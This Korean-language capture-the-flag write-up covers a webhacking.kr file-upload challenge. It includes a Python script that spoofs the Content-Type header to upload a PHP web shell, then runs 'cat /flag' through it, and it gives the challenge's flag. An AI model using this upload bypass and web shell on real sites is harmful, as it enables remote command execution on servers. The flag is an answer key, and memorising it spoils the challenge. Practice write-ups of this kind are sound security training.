# [목차]
**1. [Description](#Description)**

**2. [Write-Up](#Write-Up)**

**3. [FLAG](#FLAG)**


***


# **Description**

![](images/2022-01-03-11-57-42.png)


# **Write-Up**

php확장자를 가진 파일을 업로드하였더니 wrong type이라고 한다.

![](images/2022-01-03-11-57-53.png)

~~몇가지 text나 아무 확장자를 올려봤을 때, wrong type이 나왔고, png나 jpg만 올라갔다. 그렇다면 Content-Type을 바꿔서 올려보자.~~

```python
import requests

CHALLENGE   = 'http://webhacking.kr:10004/index.php'
SESSION_ID  = 'iojfbh0sobkvbtp5i4ftu52ti0'
headers     = {'Cookie':'PHPSESSID='+SESSION_ID, 'Content-Type': 'image/png'}
files       = {'file':('test.php','<?php system($_GET[\'cmd\']); ?>')}
req         = requests.post(CHALLENGE, headers=headers, files=files)

CHALLENGE   = 'http://webhacking.kr:10004/upload/test.php?cmd=cat /flag'
headers     = {'Cookie':'PHPSESSID='+SESSION_ID}
req         = requests.get(CHALLENGE, headers=headers)
print(req.text)

[Output]
FLAG{V2hhdCBkaWQgeW91IGV4cGVjdD8=}
```

proxy를 이용하여 Content-Type을 image/png로 바꾸면 잘 업로드된다.

FLAG를 인증하여 점수를 획득하자.

![](images/2022-01-03-11-59-08.png)


# **FLAG**

**FLAG{V2hhdCBkaWQgeW91IGV4cGVjdD8=}**